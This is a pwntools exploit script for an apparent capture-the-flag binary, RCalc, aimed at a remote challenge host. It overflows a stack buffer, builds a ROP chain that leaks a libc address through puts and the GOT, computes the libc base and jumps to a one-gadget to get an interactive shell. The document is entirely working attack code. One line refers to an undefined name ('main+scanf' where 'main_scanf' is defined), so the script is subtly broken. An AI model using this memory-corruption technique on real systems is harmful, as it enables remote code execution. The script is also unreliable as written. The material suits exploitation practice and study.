from pwn import *

main_scanf = 0x400fcc
puts_plt = 0x400820
puts_got = 0x602020
libc_start_main_got = 0x601FF0
p_rdi = 0x401123

#s = process('./RCalc')
s = remote('rcalc.2017.teamrois.cn' ,2333)

def menu(index, num_1, num_2, save):
	sleep(0.02)
	s.sendline(index)
	s.recvuntil(': ')
	s.sendline(num_1)
	s.sendline(num_2)
	s.recvuntil('? ')
	s.sendline(save)

s.recvuntil('ls: ')
payload = 'A' * 8 * 33
payload += p64(12345678)
payload += p64(puts_got+0x110)
payload += p64(p_rdi) + p64(libc_start_main_got)
payload += p64(puts_plt + 6)
payload += p64(main+scanf)

s.sendline(payload)
for i in range(34):
	menu('1','0','0','yes')
menu('1','12345678','0','yes')

s.recvuntil(':')
s.sendline('5')
libc_start_main_add =  u64(s.recv(6) + "\x00"*2)
libc_base = libc_start_main_add - 0x20740
oneshot = libc_base + 0xf0567
log.info("LIBC BASE : " +  hex(libc_base))

s.sendline(p64(oneshot))
s.success('GOT SHELL!')
s.interactive()
